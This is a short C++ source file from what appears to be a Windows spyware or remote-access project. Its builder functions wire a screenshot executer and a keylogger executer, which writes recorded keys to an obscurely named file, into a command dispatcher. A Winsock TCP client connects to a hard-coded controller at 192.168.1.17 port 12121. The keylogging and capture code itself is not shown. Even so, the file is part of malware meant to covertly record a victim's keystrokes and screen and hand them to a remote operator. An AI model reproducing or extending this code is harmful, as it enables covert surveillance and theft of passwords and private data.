#include "utils/builders.h"

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"
#include "methods/keylogger/Keylogger.h"
#include "methods/keylogger/KeysRecorder.h"
#include "methods/keylogger/IKeyloggerImplementation.h"
#include "networking/WinsockTCPClient.h"



command::ICommandExecuter*
utils::builders::BuildScreenshotExecuter()
{
    return ( new command::ScreenshotExecuter(1) );
}

command::ICommandExecuter*
utils::builders::BuildKeyloggerExecuter()
{
    using namespace methods::keylogger;

    IKeyloggerImplementation *impl = new KeysRecorder("harta_mashu_hazak.blk");

    Keylogger keylogger( impl );

    return ( new command::KeyloggerExecuter(2, keylogger) );
}

command::CommandDispatcher*
utils::builders::BuildDispatcher()
{
    command::CommandDispatcher *dispatcher = new command::CommandDispatcher();

    dispatcher->Add(BuildScreenshotExecuter());
    dispatcher->Add(BuildKeyloggerExecuter());

    return ( dispatcher );
}

networking::WinsockTCPClient*
utils::builders::BuildClient()
{
    return ( new networking::WinsockTCPClient("192.168.1.17", 12121) );
}

